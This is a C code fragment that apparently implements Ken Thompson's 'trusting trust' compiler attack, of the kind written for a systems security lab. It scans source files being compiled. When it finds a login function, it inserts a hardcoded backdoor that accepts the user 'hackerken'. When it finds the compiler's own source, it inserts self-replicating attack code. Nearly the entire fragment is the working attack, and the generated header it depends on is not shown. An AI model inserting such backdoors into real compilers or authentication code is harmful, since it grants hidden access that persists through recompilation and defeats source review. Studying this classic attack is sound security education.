// make #include appear on new line
// replace this include with the generated contents of the file attack-array.h
#include "attack-array.h"
    // naive fingerprints for now
    // needs to ./generate-attack-array < attack.c > attack-array.h
    static char compile_sig[] = "/* open the file */";
    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"hackerken\") == 0) return 1;";

    /* attack code follows */

#define N  8 * 1024 * 1024

    static char program[N+1];
    int x_fd = open(filename, O_RDONLY);
    int n = read(x_fd, program, N);
    char *login_sig_loc = strstr(program, login_sig);
    printf("LOOKING FOR LOGIN SIG!");
    int done = 0;
    if (done == 0 && login_sig_loc != NULL) {
        printf("FOUND LOGIN SIG!");
        static char tmp[8*1024*1024 + 1];
        size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
        strcpy(tmp, program + login_attack_offset);
        strcpy(program + login_attack_offset, login_attack);
        strcpy(program + login_attack_offset + strlen(login_attack), tmp);

        FILE *file;
        if ((file = fopen("attack-tmp.c", "r")))
        {

        }
        else        {
        FILE *fptmp = fopen("attack-tmp.c", "ab");
        if (fptmp != NULL)
        {
        fputs(program, fptmp);
        fclose(fptmp);
        }
        filename = "attack-tmp.c";
        done = 1;

        }

    }

    char *compile_sig_loc = strstr(program, compile_sig);
    //printf("LOOKING FOR COMPILER SIG!");
    if (compile_sig_loc != NULL) {
        //printf("FOUND COMPILER SIG!");
        static char tmp[8*1024*1024 + 1];
        size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
        strcpy(tmp, program + compile_attack_offset);
        strcpy(program + compile_attack_offset, compile_attack);
        strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);

FILE *file;
if ((file = fopen("attack-tmp2.c", "r")))
{

}
else
{
FILE *fptmp = fopen("attack-tmp2.c", "ab");
if (fptmp != NULL)
{
fputs(program, fptmp);
fclose(fptmp);
}
filename = "attack-tmp2.c";
}

}
